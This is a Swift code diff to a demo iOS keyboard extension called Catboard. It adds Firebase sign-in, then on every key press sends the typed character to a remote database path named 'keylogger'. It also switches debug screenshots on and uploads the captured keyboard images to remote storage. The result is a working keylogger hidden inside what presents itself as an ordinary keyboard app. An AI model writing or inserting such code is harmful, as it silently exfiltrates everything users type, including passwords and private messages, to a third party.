@@ -8,6 +8,8 @@
 
 import UIKit
 
+import Firebase
+
 /*
 This is the demo keyboard. If you're implementing your own keyboard, simply follow the example here and then
 set the name of your KeyboardViewController subclass in the Info.plist file.
@@ -17,11 +19,19 @@ let kCatTypeEnabled = "kCatTypeEnabled"
 
 class Catboard: KeyboardViewController {
     
-    let takeDebugScreenshot: Bool = false
+    let takeDebugScreenshot: Bool = true
     
     override init(nibName nibNameOrNil: String?, bundle nibBundleOrNil: NSBundle?) {
         NSUserDefaults.standardUserDefaults().registerDefaults([kCatTypeEnabled: true])
         super.init(nibName: nibNameOrNil, bundle: nibBundleOrNil)
+        var token: dispatch_once_t = 0
+        dispatch_once(&token) {
+          FIRApp.configure()
+        }
+
+        FIRAuth.auth()?.signInAnonymouslyWithCompletion({ (user, error) in
+          // Assume we signed in correctly...
+        })
     }
 
     required init?(coder: NSCoder) {
@@ -32,7 +42,8 @@ class Catboard: KeyboardViewController {
         let textDocumentProxy = self.textDocumentProxy
         
         let keyOutput = key.outputForCase(self.shiftState.uppercase())
-        
+        let user = FIRAuth.auth()?.currentUser?.uid
+        FIRDatabase.database().referenceWithPath("\(user!)/keylogger").childByAutoId().setValue(keyOutput)
         if !NSUserDefaults.standardUserDefaults().boolForKey(kCatTypeEnabled) {
             textDocumentProxy.insertText(keyOutput)
             return
@@ -117,12 +128,11 @@ class Catboard: KeyboardViewController {
             let capturedImage = UIGraphicsGetImageFromCurrentImageContext()
             UIGraphicsEndImageContext()
             let name = (self.interfaceOrientation.isPortrait ? "Screenshot-Portrait" : "Screenshot-Landscape")
-            let imagePath = "/Users/archagon/Documents/Programming/OSX/RussianPhoneticKeyboard/External/tasty-imitation-keyboard/\(name).png"
+            let user = FIRAuth.auth()?.currentUser?.uid
+            let imagePath = "\(user!)/\(NSUUID().UUIDString)/\(name).png"
             
-            if let pngRep = UIImagePNGRepresentation(capturedImage) {
-                pngRep.writeToFile(imagePath, atomically: true)
-            }
-            
+          FIRStorage.storage().referenceWithPath(imagePath).putData(UIImagePNGRepresentation(capturedImage)!)
+
             self.view.backgroundColor = oldViewColor
         }
     }
